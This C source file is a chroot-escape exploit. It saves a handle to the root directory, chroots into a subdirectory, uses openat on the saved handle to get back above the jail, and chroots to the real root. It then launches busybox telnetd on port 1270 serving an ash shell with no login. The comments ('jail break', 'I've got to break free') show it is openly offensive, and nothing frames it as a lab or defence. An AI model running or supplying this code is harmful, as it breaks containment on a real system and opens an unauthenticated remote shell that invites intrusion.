#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>

int main()
{
    // jail break
    chdir("/");
    int ch_root_handle = open(".", O_RDONLY);
    if (ch_root_handle == -1)
    {
        return 1;   
    }
    // go deeper
    chroot("rw/");
    // I've got to break free
    int fd2 = openat(ch_root_handle, "../", O_RDONLY);
    if (fd2 == -1) {
        perror("openat");
        return 1;
    }
    fchdir(fd2);
    chroot(".");
    char* shell[] = { "/rw/disk/busybox", "telnetd", "-l", "/rw/disk/ash", "-p", "1270", NULL };
    execv(shell[0], shell); 
    return 0;
}

